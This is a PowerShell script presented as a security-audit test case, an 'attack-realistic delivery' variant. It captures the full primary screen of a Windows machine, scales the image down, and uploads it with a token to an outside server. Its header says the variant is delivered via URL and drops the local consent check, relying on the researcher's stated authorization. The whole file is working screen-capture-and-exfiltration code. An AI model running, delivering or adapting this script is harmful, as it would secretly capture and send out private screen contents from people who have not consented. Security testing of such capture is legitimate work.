# SECURITY AUDIT ONLY - TC-004-FS-DL attack-realistic delivery variant
# Generated artifact: delivered via the researcher's fixed URL; NO local
# consent marker or token file is required on the target machine (the
# researcher's documented authorization replaces the machine-local consent
# marker for this variant). The one-purpose upload token is embedded at
# generation time on the server (__UPLOAD_TOKEN__ placeholder below) and is
# rotated before/after each test window.
# Target: the dedicated clean Windows machine only. Captures the full primary
# screen, scales down to the server's 2 MiB upload limit, uploads, and compares
# the server receipt hash with the local PNG hash.

[CmdletBinding()]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

if (-not [Environment]::UserInteractive) {
    throw 'TC-004-FS-DL requires an interactive desktop session.'
}

$uploadUri = 'https://g.anyq.site/integrity-lab/api/canary/upload'
$uploadToken = '__UPLOAD_TOKEN__'

$labRoot = Join-Path $env:USERPROFILE 'AIIntegrityLab'
New-Item -ItemType Directory -Force -Path $labRoot | Out-Null
$canaryId = 'CANARY-' + ([Guid]::NewGuid().ToString('N').Substring(0, 12).ToUpperInvariant())
$outputPath = Join-Path $labRoot ($canaryId + '.png')

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# Fix partial full-screen capture on DPI-scaled displays: Screen.Bounds
# returns logical pixels unless the process is DPI-aware, while
# CopyFromScreen works in physical pixels.
Add-Type @'
using System;
using System.Runtime.InteropServices;
public static class DpiHelper {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
'@
[DpiHelper]::SetProcessDPIAware() | Out-Null

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

function New-CaptureBitmap {
    param([double]$Scale)
    $w = [math]::Max(1, [int]($bounds.Width * $Scale))
    $h = [math]::Max(1, [int]($bounds.Height * $Scale))
    $full = $null
    $scaled = New-Object System.Drawing.Bitmap($w, $h)
    $g = $null
    try {
        $full = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $gf = [System.Drawing.Graphics]::FromImage($full)
        try {
            $gf.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        } finally {
            $gf.Dispose()
        }
        $g = [System.Drawing.Graphics]::FromImage($scaled)
        $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
        $g.DrawImage($full, 0, 0, $w, $h)
    } finally {
        if ($null -ne $g) { $g.Dispose() }
        if ($null -ne $full) { $full.Dispose() }
    }
    return $scaled
}

$bitmap = $null
try {
    $scale = 0.8
    $bitmap = New-CaptureBitmap -Scale $scale
    $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
    foreach ($stepScale in @(0.6, 0.45, 0.3)) {
        $size = (Get-Item -LiteralPath $outputPath).Length
        if ($size -le 1900000) { break }
        if ($null -ne $bitmap) { $bitmap.Dispose() }
        $scale = $stepScale
        $bitmap = New-CaptureBitmap -Scale $scale
        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
    }
    $size = (Get-Item -LiteralPath $outputPath).Length
    if ($size -gt 1900000) { throw "Captured PNG still exceeds the upload limit: $size bytes" }
} finally {
    if ($null -ne $bitmap) { $bitmap.Dispose() }
}

$localSha256 = (Get-FileHash -Algorithm SHA256 -LiteralPath $outputPath).Hash.ToLowerInvariant()
$response = Invoke-RestMethod -Method Post -Uri $uploadUri -ContentType 'image/png' -Headers @{
    'X-AI-Canary-Id' = $canaryId
    'X-AI-Canary-Token' = $uploadToken
} -InFile $outputPath -TimeoutSec 30

if ($response.sha256 -ne $localSha256) {
    throw 'Server receipt hash does not match the local PNG.'
}

[pscustomobject]@{
    case_id = 'TC-004-FS-DL'
    canary_id = $canaryId
    local_path = $outputPath
    local_sha256 = $localSha256
    server_sha256 = $response.sha256
    bytes = $response.bytes
    scale = $scale
    server_retained_image = $false
} | ConvertTo-Json -Compress
